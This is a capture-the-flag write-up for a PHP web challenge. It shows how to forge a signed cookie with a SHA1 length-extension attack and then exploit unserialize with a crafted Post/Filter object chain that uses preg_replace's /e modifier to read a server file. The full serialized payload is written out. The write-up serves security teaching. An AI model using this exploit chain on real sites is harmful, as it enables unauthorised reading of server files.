We are told that a group of hackers have taken over a website and they have changed 
the secret code without changing its length. 
Our goal is to read the "/home/daedalus/flag.txt" file

root_data.php
<?php
define('AUTH_SECRET', "AAAAAAAA");
?>

First thing that comes to mind is that there is a user entry possible here : 

index.php
<?php
include(STEVES_LIST_ABSOLUTE_INCLUDE_ROOT . "cookies.php");
?>

cookies.php
<?php
if (isset($_COOKIE['custom_settings'])) {
    // We should verify to make sure this thing is legit.
    $custom_settings = urldecode($_COOKIE['custom_settings']);
    $hash = sha1(AUTH_SECRET . $custom_settings);
    if ($hash !== $_COOKIE['custom_settings_hash']) {
        die("Why would you hack Section Chief Steve's site? :(");
    }
    // we only support one setting for now, but we might as well put this in.
    $settings_array = explode("\n", $custom_settings);
    $custom_settings = array();
    for ($i = 0; $i < count($settings_array); $i++) {
      $setting = $settings_array[$i];
      $setting = unserialize($setting);
      $custom_settings[] = $setting;
    }
  }
  else {
    $custom_settings = array(0 => true);
    setcookie('custom_settings', urlencode(serialize(true)), time() + 86400 * 30, "/");
    setcookie('custom_settings_hash', sha1(AUTH_SECRET . serialize(true)), time() + 86400 * 30, "/");
  }
?>

Of course, we want to bypass the "Why would you hack Section Chief Steve's site? :("
We have to be able to generate a serialized cookie with arbitraty information within and a hash signature
that is accepted by the server. 

We know that with a Merckel-Damgard hash function, a hash extension attack is possible. 

The concept is well explained at the following site : https://blog.whitehatsec.com/hash-length-extension-attacks/
It is possible to use the following project to easily generate hash extension : https://github.com/iagox86/hash_extender

The coolest feature of this tool is that you can encode your input and output.

A quick test will show you can now pass any cookie using the prefix and hash given automatically by the server. 

Now, how to move further and read the "/home/daedalus/flag.txt" file? 

A quick look at the processing of the cookie shows that you can give arbitraty data to the unserialize function. 
What happens if we give serialized objects to unserialize ? Actually, the function creates the object, 
calling its __construct() and __destruct() functions.

classes.php
<?php
class Filter {
protected $pattern;
protected $repl;
function __construct($pattern, $repl) {
  $this->pattern = $pattern;
  $this->repl = $repl;
}
function filter($data) {
  return preg_replace($this->pattern, $this->repl, $data);
}
};

class Post {
protected $title;
protected $text;
protected $filters;
function __construct($title, $text, $filters) {
  $this->title = $title;
  $this->text = $text;
  $this->filters = $filters;
}

function get_title() {
  return htmlspecialchars($this->title);
}

function display_post() {
  $text = htmlspecialchars($this->text);
  foreach ($this->filters as $filter)
    $text = $filter->filter($text);
  return $text;
}

function __destruct() {
  // debugging stuff
  $s = "<!-- POST " . htmlspecialchars($this->title);
  $text = htmlspecialchars($this->text);
  foreach ($this->filters as $filter)
    $text = $filter->filter($text);
  $s = $s . ": " . $text;
  $s = $s . " -->";
  echo $s;
}
};

?>

Then, with unserialize we can create a "Post" object which contains a "Filter" attribute with custom filters and replacement. 
php preg_replace allows us to use callbacks with the /e option. 
Then with the following regex "/\[img\](.*)\[\/img\]/e" and replacement "file_get_contents('\\1')" everything caugth between 
the [img] tag will be argument of the file_get_contents function as callback. 
The content of the article is now easy to guess : "aa [img]/home/daedalus/flag.txt[/img]"

Now, the goal is to serialize our Post object, generate the signature, use it as cookie and collect our flag in source code comment
displayed by the __destruct function. 

The serialized object : O:4:"Post":3:{s:8:"\0*\0title";s:23:"I'm Section Chief Steve";s:7:"\0*\0text";s:37:"aa [img]/home/daedalus/flag.txt[/img]";s:10:"\0*\0filters";a:1:{i:0;O:6:"Filter":2:{s:10:"\0*\0pattern";s:23:"/\[img\](.*)\[\/img\]/e";s:7:"\0*\0repl";s:23:"file_get_contents('\\1')";}}}

